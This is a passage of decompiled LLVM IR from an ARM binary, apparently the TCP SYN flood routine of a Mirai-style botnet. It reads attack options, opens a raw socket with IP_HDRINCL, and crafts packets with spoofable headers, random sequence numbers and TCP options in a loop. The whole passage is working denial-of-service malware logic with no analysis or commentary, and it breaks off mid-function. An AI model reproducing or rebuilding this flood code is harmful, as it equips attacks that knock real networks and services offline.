  %v5_c3e0 = call i32 @attack_get_opt_int(i32 %v0_c3dc, i32* %v4_c3e0, i32 16, i32 65535)
  %v0_c3e4 = load i32, i32* @r4, align 4
  store i32 %v0_c3e4, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3f4 = load i32, i32* @r5, align 4
  store i32 %v0_c3f4, i32* %r0.global-to-local, align 4
  %v5_c3f8 = inttoptr i32 %v0_c3e4 to i32*
  %v6_c3f8 = call i32 @attack_get_opt_int(i32 %v0_c3f4, i32* %v5_c3f8, i32 17, i32 0)
  %v0_c3fc = load i32, i32* @r4, align 4
  store i32 %v0_c3fc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c40c = load i32, i32* @r5, align 4
  store i32 %v0_c40c, i32* %r0.global-to-local, align 4
  %v5_c410 = inttoptr i32 %v0_c3fc to i32*
  %v6_c410 = call i32 @attack_get_opt_int(i32 %v0_c40c, i32* %v5_c410, i32 10, i32 0)
  %v0_c414 = load i32, i32* @r4, align 4
  store i32 %v0_c414, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c424 = load i32, i32* @r5, align 4
  store i32 %v0_c424, i32* %r0.global-to-local, align 4
  %v5_c428 = inttoptr i32 %v0_c414 to i32*
  %v6_c428 = call i32 @attack_get_opt_int(i32 %v0_c424, i32* %v5_c428, i32 11, i32 0)
  %v0_c42c = load i32, i32* @r4, align 4
  store i32 %v0_c42c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c43c = load i32, i32* @r5, align 4
  store i32 %v0_c43c, i32* %r0.global-to-local, align 4
  %v5_c440 = inttoptr i32 %v0_c42c to i32*
  %v6_c440 = call i32 @attack_get_opt_int(i32 %v0_c43c, i32* %v5_c440, i32 12, i32 0)
  %v0_c444 = load i32, i32* @r4, align 4
  store i32 %v0_c444, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c454 = load i32, i32* @r5, align 4
  store i32 %v0_c454, i32* %r0.global-to-local, align 4
  %v5_c458 = inttoptr i32 %v0_c444 to i32*
  %v6_c458 = call i32 @attack_get_opt_int(i32 %v0_c454, i32* %v5_c458, i32 13, i32 0)
  %v0_c45c = load i32, i32* @r4, align 4
  store i32 %v0_c45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c46c = load i32, i32* @r5, align 4
  store i32 %v0_c46c, i32* %r0.global-to-local, align 4
  %v5_c470 = inttoptr i32 %v0_c45c to i32*
  %v6_c470 = call i32 @attack_get_opt_int(i32 %v0_c46c, i32* %v5_c470, i32 14, i32 1)
  %v0_c474 = load i32, i32* @r4, align 4
  store i32 %v0_c474, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c484 = load i32, i32* @r5, align 4
  store i32 %v0_c484, i32* %r0.global-to-local, align 4
  %v5_c488 = inttoptr i32 %v0_c474 to i32*
  %v6_c488 = call i32 @attack_get_opt_int(i32 %v0_c484, i32* %v5_c488, i32 15, i32 0)
  %v0_c490 = load i32, i32* @r4, align 4
  store i32 %v0_c490, i32* %r1.global-to-local, align 4
  %v2_c494 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_c494, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @r5, align 4
  store i32 %v0_c4a0, i32* %r0.global-to-local, align 4
  %v5_c4a4 = inttoptr i32 %v0_c490 to i32*
  %v6_c4a4 = call i32 @attack_get_opt_ip(i32 %v0_c4a0, i32* %v5_c4a4, i32 24, i32 %v2_c494, i32 %v6_c488)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @__GI_time(i32* null)
  %v1_c4b4 = load i32, i32* @r6, align 4
  %v2_c4b4 = add i32 %v1_c4b4, %v2_c4b0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c4c8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c4c8, i32* %r0.global-to-local, align 4
  %v7_c4cc = icmp eq i32 %v3_c4c8, -1
  store i1 %v7_c4cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c4c8, i32* @r8, align 4
  br i1 %v7_c4cc, label %dec_label_pc_c9a0, label %dec_label_pc_c4d8

dec_label_pc_c4d8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c4e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c4e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c4f4 = call i32 @__GI_setsockopt(i32 %v3_c4c8, i32 0, i32 3, i32 %v6_c4e0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c4f4, i32* %r0.global-to-local, align 4
  %v7_c4f8 = icmp eq i32 %v5_c4f4, -1
  store i1 %v7_c4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c4f8, label %dec_label_pc_c9ac, label %dec_label_pc_c500

dec_label_pc_c500:                                ; preds = %dec_label_pc_c4d8
  %v3_c50c = mul i32 %v7_c34c, 65536
  store i32 %v3_c50c, i32* %r0.global-to-local, align 4
  %v0_c514 = load i32, i32* %fp.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c410, i32* %r1.global-to-local, align 4
  %v3_c520 = urem i32 %v7_c34c, 65536
  store i32 %v3_c520, i32* %r2.global-to-local, align 4
  %v3_c524 = urem i32 %v6_c3a8, 65536
  store i32 %v3_c524, i32* %r3.global-to-local, align 4
  %v3_c528 = urem i32 %v0_c514, 65536
  %v0_c52c = load i32, i32* @sb, align 4
  %v2_c52c = icmp eq i32 %v0_c52c, 0
  store i1 %v2_c52c, i1* %cpsr_z.global-to-local, align 1
  %v1_c53c = urem i32 %v6_c410, 256
  store i32 %v1_c53c, i32* @fp, align 4
  br i1 %v2_c52c, label %dec_label_pc_c790.preheader, label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c500
  %trunc = trunc i32 %v7_c34c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp60 = mul nuw nsw i32 %v3_c524, 256
  %v3_c570 = and i32 %tmp60, 65280
  %tmp61 = mul i32 %v0_c514, 256
  %v3_c574 = and i32 %tmp61, 65280
  %tmp62 = mul i32 %v5_c3e0, 256
  %v3_c578 = and i32 %tmp62, 65280
  %v1_c57c = urem i32 %v6_c410, 2
  %tmp63 = udiv i32 %v6_c3a8, 256
  %v4_c580 = urem i32 %tmp63, 256
  %v5_c580 = or i32 %v3_c570, %v4_c580
  %tmp64 = udiv i32 %v0_c514, 256
  %v4_c584 = urem i32 %tmp64, 256
  %v5_c584 = or i32 %v4_c584, %v3_c574
  store i32 %v5_c584, i32* @r5, align 4
  %tmp65 = udiv i32 %v5_c3e0, 256
  %v4_c588 = urem i32 %tmp65, 256
  %v5_c588 = or i32 %v4_c588, %v3_c578
  store i32 %v5_c588, i32* @lr, align 4
  %v1_c59c = urem i32 %v6_c428, 2
  store i32 %v1_c59c, i32* %r1.global-to-local, align 4
  %v1_c5a0 = urem i32 %v6_c440, 2
  store i32 %v1_c5a0, i32* %r2.global-to-local, align 4
  %v1_c5a4 = urem i32 %v6_c458, 2
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  %v1_c5a8 = urem i32 %v6_c470, 2
  store i32 %v1_c5a8, i32* @r6, align 4
  %v1_c5ac = urem i32 %v6_c488, 2
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_c628 = trunc i32 %v6_c364 to i8
  %sext6 = mul nuw i32 %v5_c580, 65536
  %v4_c654 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_c584, 65536
  %v6_c690 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_c59c
  %v4_c6a8 = and i32 %tmp, 16
  %tmp66 = sub nsw i32 0, %v1_c5a0
  %v4_c6c0 = and i32 %tmp66, 8
  %tmp67 = sub nsw i32 0, %v1_c5a4
  %v4_c6d4 = and i32 %tmp67, 4
  %tmp68 = sub nsw i32 0, %v1_c5a8
  %v3_c6e8 = and i32 %tmp68, 2
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %.thread, %dec_label_pc_c544
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c5dc = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c5dc, i32* %r0.global-to-local, align 4
  %v3_c5e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c5e0, i32* %r2.global-to-local, align 4
  %v1_c5e4 = load i32, i32* @sl, align 4
  %v2_c5e4 = load i32, i32* @r4, align 4
  %v5_c5e4 = mul i32 %v2_c5e4, 4
  %v6_c5e4 = add i32 %v5_c5e4, %v1_c5e4
  %v7_c5e4 = inttoptr i32 %v6_c5e4 to i32*
  store i32 %v2_c5dc, i32* %v7_c5e4, align 4
  %v0_c5e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c5e8 = mul i32 %v0_c5e8, 32
  store i32 %v3_c5e8, i32* %r3.global-to-local, align 4
  %v0_c5ec = load i32, i32* @sl, align 4
  %v4_c5ec = mul i32 %v0_c5e8, 4
  %v5_c5ec = add i32 %v0_c5ec, %v4_c5ec
  %v6_c5ec = inttoptr i32 %v5_c5ec to i32*
  %v7_c5ec = load i32, i32* %v6_c5ec, align 4
  store i32 %v7_c5ec, i32* %r4.global-to-local, align 4
  %v5_c5f0 = mul i32 %v0_c5e8, 24
  store i32 %v5_c5f0, i32* %r3.global-to-local, align 4
  %v1_c5f4 = load i32, i32* @r7, align 4
  %v2_c5f4 = add i32 %v1_c5f4, %v5_c5f0
  store i32 %v2_c5f4, i32* %r0.global-to-local, align 4
  %v1_c5f8 = inttoptr i32 %v7_c5ec to i8*
  %v2_c5f8 = load i8, i8* %v1_c5f8, align 1
  %tmp69 = urem i8 %v2_c5f8, 16
  %v1_c5fc = zext i8 %tmp69 to i32
  %v1_c600 = or i32 %v1_c5fc, 64
  store i32 %v1_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v1_c600 to i8
  store i8 %v1_c604, i8* %v1_c5f8, align 1
  %v0_c608 = load i32, i32* %r4.global-to-local, align 4
  %v1_c608 = inttoptr i32 %v0_c608 to i8*
  %v2_c608 = load i8, i8* %v1_c608, align 1
  %v1_c60c = and i8 %v2_c608, -16
  %v1_c610 = or i8 %v1_c60c, 5
  store i32 %v1_c390, i32* %r1.global-to-local, align 4
  store i8 %v1_c610, i8* %v1_c608, align 1
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 1
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v5_c348, i8* %v4_c620, align 1
  store i32 %v1_c36c, i32* %r3.global-to-local, align 4
  %v2_c628 = load i32, i32* %r4.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 8
  %v4_c628 = inttoptr i32 %v3_c628 to i8*
  store i8 %v1_c628, i8* %v4_c628, align 1
  %v0_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = icmp eq i32 %v0_c630, 0
  store i1 %v2_c630, i1* %cpsr_z.global-to-local, align 1
  %v2_c634 = load i32, i32* %r4.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 4
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %rev, i16* %v4_c634, align 2
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_c63c = load i32, i32* %r4.global-to-local, align 4
  %v3_c63c = add i32 %v2_c63c, 9
  %v4_c63c = inttoptr i32 %v3_c63c to i8*
  store i8 6, i8* %v4_c63c, align 1
  %v0_c640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c640, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c5d4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c644 = load i32, i32* %r4.global-to-local, align 4
  %v4_c644 = add i32 %v3_c644, 6
  %v5_c644 = inttoptr i32 %v4_c644 to i16*
  store i16 64, i16* %v5_c644, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c5d4, %bb
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  %v1_c64c = load i32, i32* %r4.global-to-local, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v6_c4a4, i32* %v3_c64c, align 4
  %v0_c650 = load i32, i32* %r0.global-to-local, align 4
  %v1_c650 = add i32 %v0_c650, 16
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  store i32 %v4_c654, i32* %r0.global-to-local, align 4
  %v2_c65c = load i32, i32* %r4.global-to-local, align 4
  %v3_c65c = add i32 %v2_c65c, 2
  %v4_c65c = inttoptr i32 %v3_c65c to i16*
  store i16 15360, i16* %v4_c65c, align 2
  %v0_c660 = load i32, i32* %r3.global-to-local, align 4
  %v1_c660 = load i32, i32* %r4.global-to-local, align 4
  %v2_c660 = add i32 %v1_c660, 16
  %v3_c660 = inttoptr i32 %v2_c660 to i32*
  store i32 %v0_c660, i32* %v3_c660, align 4
  %v0_c664 = load i32, i32* %r0.global-to-local, align 4
  %v1_c664 = trunc i32 %v0_c664 to i16
  %v2_c664 = load i32, i32* %r4.global-to-local, align 4
  %v3_c664 = add i32 %v2_c664, 20
  %v4_c664 = inttoptr i32 %v3_c664 to i16*
  store i16 %v1_c664, i16* %v4_c664, align 2
  %v0_c668 = load i32, i32* %r4.global-to-local, align 4
  %v1_c668 = add i32 %v0_c668, 20
  store i32 %v1_c668, i32* %r1.global-to-local, align 4
  %v1_c66c = add i32 %v0_c668, 32
  %v2_c66c = inttoptr i32 %v1_c66c to i8*
  %v3_c66c = load i8, i8* %v2_c66c, align 1
  %v4_c66c = zext i8 %v3_c66c to i32
  store i32 %v4_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add i32 %v0_c668, 33
  %v2_c670 = inttoptr i32 %v1_c670 to i8*
  %v3_c670 = load i8, i8* %v2_c670, align 1
  %v4_c670 = zext i8 %v3_c670 to i32
  store i32 %v1_c57c, i32* %r0.global-to-local, align 4
  %v1_c678 = urem i8 %v3_c66c, 16
  %v1_c67c = or i8 %v1_c678, -96
  %v1_c680 = and i32 %v4_c670, 223
  store i32 %v1_c680, i32* %r2.global-to-local, align 4
  store i8 %v1_c67c, i8* %v2_c66c, align 1
  %v0_c688 = load i32, i32* %r2.global-to-local, align 4
  %v1_c688 = load i32, i32* %r0.global-to-local, align 4
  %v4_c688 = mul i32 %v1_c688, 32
  %v5_c688 = or i32 %v4_c688, %v0_c688
  store i32 %v5_c688, i32* %r2.global-to-local, align 4
  store i32 %v5_c588, i32* %r0.global-to-local, align 4
  store i32 %v6_c690, i32* %r3.global-to-local, align 4
  %v1_c694 = trunc i32 %v5_c688 to i8
  %v2_c694 = load i32, i32* %r1.global-to-local, align 4
  %v3_c694 = add i32 %v2_c694, 13
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r3.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i16
  %v2_c698 = load i32, i32* %r1.global-to-local, align 4
  %v3_c698 = add i32 %v2_c698, 2
  %v4_c698 = inttoptr i32 %v3_c698 to i16*
  store i16 %v1_c698, i16* %v4_c698, align 2
  %v0_c69c = load i32, i32* %r1.global-to-local, align 4
  %v1_c69c = add i32 %v0_c69c, 13
  %v2_c69c = inttoptr i32 %v1_c69c to i8*
  %v3_c69c = load i8, i8* %v2_c69c, align 1
  %v4_c69c = zext i8 %v3_c69c to i32
  store i32 %v1_c59c, i32* %r2.global-to-local, align 4
  %v1_c6a4 = and i32 %v4_c69c, 239
  %v5_c6a8 = or i32 %v1_c6a4, %v4_c6a8
  store i32 %v5_c6a8, i32* %r3.global-to-local, align 4
  %v0_c6ac = load i32, i32* %r0.global-to-local, align 4
  %v2_c6ac = add i32 %v0_c69c, 4
  %v3_c6ac = inttoptr i32 %v2_c6ac to i32*
  store i32 %v0_c6ac, i32* %v3_c6ac, align 4
  %v0_c6b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6b0 = trunc i32 %v0_c6b0 to i8
  %v2_c6b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c6b0 = add i32 %v2_c6b0, 13
  %v4_c6b0 = inttoptr i32 %v3_c6b0 to i8*
  store i8 %v1_c6b0, i8* %v4_c6b0, align 1
  %v0_c6b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6b4 = add i32 %v0_c6b4, 13
  %v2_c6b4 = inttoptr i32 %v1_c6b4 to i8*
  %v3_c6b4 = load i8, i8* %v2_c6b4, align 1
  %v4_c6b4 = zext i8 %v3_c6b4 to i32
  store i32 %v1_c5a0, i32* %r3.global-to-local, align 4
  %v1_c6bc = and i32 %v4_c6b4, 247
  %v5_c6c0 = or i32 %v1_c6bc, %v4_c6c0
  store i32 %v5_c6c0, i32* %r2.global-to-local, align 4
  %v1_c6c4 = trunc i32 %v5_c6c0 to i8
  store i8 %v1_c6c4, i8* %v2_c6b4, align 1
  %v0_c6c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 13
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i8*
  %v3_c6c8 = load i8, i8* %v2_c6c8, align 1
  %v4_c6c8 = zext i8 %v3_c6c8 to i32
  store i32 %v1_c5a4, i32* %r0.global-to-local, align 4
  %v1_c6d0 = and i32 %v4_c6c8, 251
  %v5_c6d4 = or i32 %v1_c6d0, %v4_c6d4
  store i32 %v5_c6d4, i32* %r3.global-to-local, align 4
  %v1_c6d8 = trunc i32 %v5_c6d4 to i8
  store i8 %v1_c6d8, i8* %v2_c6c8, align 1
  %v0_c6dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c6dc = add i32 %v0_c6dc, 13
  %v2_c6dc = inttoptr i32 %v1_c6dc to i8*
  %v3_c6dc = load i8, i8* %v2_c6dc, align 1
  %v4_c6dc = zext i8 %v3_c6dc to i32
  store i32 %v1_c5a8, i32* %r3.global-to-local, align 4
  %v1_c6e4 = and i32 %v4_c6dc, 253
  %v4_c6e8 = or i32 %v1_c6e4, %v3_c6e8
  store i32 %v4_c6e8, i32* %r2.global-to-local, align 4
  %v1_c6ec = trunc i32 %v4_c6e8 to i8
  store i8 %v1_c6ec, i8* %v2_c6dc, align 1
  %v0_c6f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6f0 = add i32 %v0_c6f0, 13
  %v2_c6f0 = inttoptr i32 %v1_c6f0 to i8*
  %v3_c6f0 = load i8, i8* %v2_c6f0, align 1
  %v4_c6f0 = zext i8 %v3_c6f0 to i32
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  %v1_c6f8 = and i32 %v4_c6f0, 254
  %v2_c6fc = or i32 %v1_c6f8, %v1_c5ac
  store i32 %v2_c6fc, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 4, i32* @r6, align 4
  %v1_c708 = trunc i32 %v2_c6fc to i8
  store i8 %v1_c708, i8* %v2_c6f0, align 1
  %v0_c70c = load i32, i32* @r5, align 4
  %v1_c70c = trunc i32 %v0_c70c to i8
  %v2_c70c = load i32, i32* %r4.global-to-local, align 4
  %v3_c70c = add i32 %v2_c70c, 40
  %v4_c70c = inttoptr i32 %v3_c70c to i8*
  store i8 %v1_c70c, i8* %v4_c70c, align 1
  %v0_c710 = load i32, i32* @r6, align 4
  %v1_c710 = trunc i32 %v0_c710 to i8
  %v2_c710 = load i32, i32* %r4.global-to-local, align 4
  %v3_c710 = add i32 %v2_c710, 41
  %v4_c710 = inttoptr i32 %v3_c710 to i8*
  store i8 %v1_c710, i8* %v4_c710, align 1
  %v0_c714 = call i32 @rand_next()
  %v1_c718 = urem i32 %v0_c714, 16
  %v1_c71c = or i32 %v1_c718, 1392
  %v1_c720 = add nuw nsw i32 %v1_c71c, 8
  %v3_c724 = mul nuw nsw i32 %v1_c720, 65536
  store i32 %v3_c724, i32* %r0.global-to-local, align 4
  %v3_c728 = mul nuw nsw i32 %v1_c720, 256
  %v5_c730 = or i32 %v3_c728, 5
  %v1_c734 = trunc i32 %v5_c730 to i16
  %v2_c734 = load i32, i32* %r4.global-to-local, align 4
  %v3_c734 = add i32 %v2_c734, 42
  %v4_c734 = inttoptr i32 %v3_c734 to i16*
  store i16 %v1_c734, i16* %v4_c734, align 2
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c740 = load i32, i32* %r4.global-to-local, align 4
  %v3_c740 = add i32 %v2_c740, 46
  %v4_c740 = inttoptr i32 %v3_c740 to i8*
  store i8 8, i8* %v4_c740, align 1
  %v0_c744 = load i32, i32* %r2.global-to-local, align 4
  %v1_c744 = trunc i32 %v0_c744 to i8
  %v2_c744 = load i32, i32* %r4.global-to-local, align 4
  %v3_c744 = add i32 %v2_c744, 47
  %v4_c744 = inttoptr i32 %v3_c744 to i8*
  store i8 %v1_c744, i8* %v4_c744, align 1
  %v0_c748 = load i32, i32* @r6, align 4
  %v1_c748 = trunc i32 %v0_c748 to i8
  %v2_c748 = load i32, i32* %r4.global-to-local, align 4
  %v3_c748 = add i32 %v2_c748, 44
  %v4_c748 = inttoptr i32 %v3_c748 to i8*
  store i8 %v1_c748, i8* %v4_c748, align 1
  %v0_c74c = load i32, i32* @r5, align 4
  %v1_c74c = trunc i32 %v0_c74c to i8
  %v2_c74c = load i32, i32* %r4.global-to-local, align 4
  %v3_c74c = add i32 %v2_c74c, 45
  %v4_c74c = inttoptr i32 %v3_c74c to i8*
  store i8 %v1_c74c, i8* %v4_c74c, align 1
  %v0_c750 = call i32 @rand_next()
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v2_c758 = load i32, i32* %r4.global-to-local, align 4
  %v3_c758 = add i32 %v2_c758, 59
  %v4_c758 = inttoptr i32 %v3_c758 to i8*
  store i8 6, i8* %v4_c758, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c768 = load i32, i32* %r4.global-to-local, align 4
  %v2_c768 = add i32 %v1_c768, 48
  %v3_c768 = inttoptr i32 %v2_c768 to i32*
  store i32 %v0_c750, i32* %v3_c768, align 4
  %v0_c76c = load i32, i32* %r3.global-to-local, align 4
  %v1_c76c = load i32, i32* %r4.global-to-local, align 4
  %v2_c76c = add i32 %v1_c76c, 52
  %v3_c76c = inttoptr i32 %v2_c76c to i32*
  store i32 %v0_c76c, i32* %v3_c76c, align 4
  %v0_c770 = load i32, i32* %r2.global-to-local, align 4
  %v1_c770 = trunc i32 %v0_c770 to i8
  %v2_c770 = load i32, i32* %r4.global-to-local, align 4
  %v3_c770 = add i32 %v2_c770, 56
  %v4_c770 = inttoptr i32 %v3_c770 to i8*
  store i8 %v1_c770, i8* %v4_c770, align 1
  %v0_c774 = load i32, i32* %r1.global-to-local, align 4
  %v1_c774 = trunc i32 %v0_c774 to i8
  %v2_c774 = load i32, i32* %r4.global-to-local, align 4
  %v3_c774 = add i32 %v2_c774, 58
  %v4_c774 = inttoptr i32 %v3_c774 to i8*
  store i8 %v1_c774, i8* %v4_c774, align 1
  %v0_c778 = load i32, i32* %r1.global-to-local, align 4
  %v1_c778 = trunc i32 %v0_c778 to i8
  %v2_c778 = load i32, i32* %r4.global-to-local, align 4
  %v3_c778 = add i32 %v2_c778, 57
  %v4_c778 = inttoptr i32 %v3_c778 to i8*
  store i8 %v1_c778, i8* %v4_c778, align 1
  %v3_c77c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c77c, i32* %r3.global-to-local, align 4
  %v1_c780 = load i32, i32* %r2.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, %v3_c77c
  store i32 %v2_c780, i32* @r4, align 4
  %v1_c784 = load i32, i32* @sb, align 4
  %v9_c784 = icmp eq i32 %v2_c780, %v1_c784
  store i1 %v9_c784, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c780, i32* %stack_var_-44, align 4
  %v5_c78c = icmp slt i32 %v2_c780, %v1_c784
  br i1 %v5_c78c, label %dec_label_pc_c5d4, label %dec_label_pc_c790.preheader

dec_label_pc_c790.preheader:                      ; preds = %.thread, %dec_label_pc_c500
  %v0_c79410 = phi i32 [ 0, %dec_label_pc_c500 ], [ %v1_c784, %.thread ]
  %v2_c7ac = icmp eq i32 %v6_c4a4, -1
  %v7_c7ac = icmp eq i32 %v6_c4a4, -1
  %v3_c7c0 = icmp eq i32 %v3_c520, 65535
  br label %dec_label_pc_c790

dec_label_pc_c790:                                ; preds = %dec_label_pc_c98c.dec_label_pc_c790_crit_edge, %dec_label_pc_c790.preheader
  %v0_c794 = phi i32 [ %v0_c794.pre, %dec_label_pc_c98c.dec_label_pc_c790_crit_edge ], [ %v0_c79410, %dec_label_pc_c790.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c794 = icmp eq i32 %v0_c794, 0
  store i1 %v2_c794, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c794, label %dec_label_pc_c98c, label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c884

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c884
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7c0, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  %v1_c7cc = phi i32 [ %v1_c914, %dec_label_pc_c904 ], [ 65535, %dec_label_pc_c7b4 ]
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  %v9_c7cc = icmp eq i32 %v3_c524, %v1_c7cc
  store i1 %v9_c7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7cc, label %dec_label_pc_c934, label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge, %dec_label_pc_c7c8
  %v1_c7d8 = phi i32 [ %v1_c7d8.pre, %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge ], [ %v1_c7cc, %dec_label_pc_c7c8 ]
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v9_c7d8 = icmp eq i32 %v3_c528, %v1_c7d8
  store i1 %v9_c7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7d8, label %dec_label_pc_c948, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge, %dec_label_pc_c7d4
  %v1_c7e4 = phi i32 [ %v1_c7e4.pre, %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge ], [ %v1_c7d8, %dec_label_pc_c7d4 ]
  store i32 %v5_c3e0, i32* %r3.global-to-local, align 4
  %v9_c7e4 = icmp eq i32 %v5_c3e0, %v1_c7e4
  store i1 %v9_c7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7e4, label %dec_label_pc_c95c, label %dec_label_pc_c7ec

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge, %dec_label_pc_c7e0
  %v1_c7f0 = phi i32 [ %v1_c7f0.pre, %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge ], [ %v1_c7e4, %dec_label_pc_c7e0 ]
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v9_c7f0 = icmp eq i32 %v6_c3f8, %v1_c7f0
  store i1 %v9_c7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7f0, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c7f8 = load i32, i32* @fp, align 4
  %v2_c7f8 = icmp eq i32 %v0_c7f8, 0
  store i1 %v2_c7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7f8, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970, %dec_label_pc_c980
  %v2_c804 = load i32, i32* @r5, align 4
  %v3_c804 = add i32 %v2_c804, 10
